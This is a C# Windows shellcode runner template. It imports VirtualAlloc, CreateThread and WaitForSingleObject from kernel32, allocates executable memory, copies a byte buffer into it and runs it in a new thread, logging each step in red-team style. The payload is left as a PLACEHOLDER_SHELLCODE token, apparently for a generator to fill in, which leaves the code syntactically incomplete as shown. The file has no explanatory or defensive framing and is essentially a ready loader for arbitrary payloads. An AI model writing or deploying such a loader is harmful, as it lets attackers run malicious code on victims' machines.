using System;
using System.Runtime.InteropServices;


class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern int GetLastError();

    static void Main()
    {
        Console.WriteLine("[*] Shellcode Runner Started...");

        // Injected shellcode
        PLACEHOLDER_SHELLCODE
        };

    Console.WriteLine($"[*] Allocating {buf.Length} bytes of memory for shellcode...");

    // Allocate memory
    IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x40);
    if (mem == IntPtr.Zero)
    {
        Console.WriteLine($"[!] VirtualAlloc failed. Error: {GetLastError()}");
        return;
    }
    Console.WriteLine($"[+] Memory allocated at: 0x{mem.ToInt64():X}");

    // Copy shellcode into allocated memory
    Console.WriteLine("[*] Copying shellcode into allocated memory...");
    Marshal.Copy(buf, 0, mem, buf.Length);
    Console.WriteLine("[+] Shellcode copied successfully!");

    // Create thread to execute shellcode
    Console.WriteLine("[*] Creating thread to execute shellcode...");
    IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
    if (hThread == IntPtr.Zero)
    {
        Console.WriteLine($"[!] CreateThread failed. Error: {GetLastError()}");
        return;
    }
    Console.WriteLine($"[+] Thread created successfully at: 0x{hThread.ToInt64():X}");

    // Wait for shellcode execution to complete
    Console.WriteLine("[*] Waiting for shellcode execution...");
    WaitForSingleObject(hThread, 0xFFFFFFFF);

    Console.WriteLine("[+] Shellcode execution completed!");
    }
}
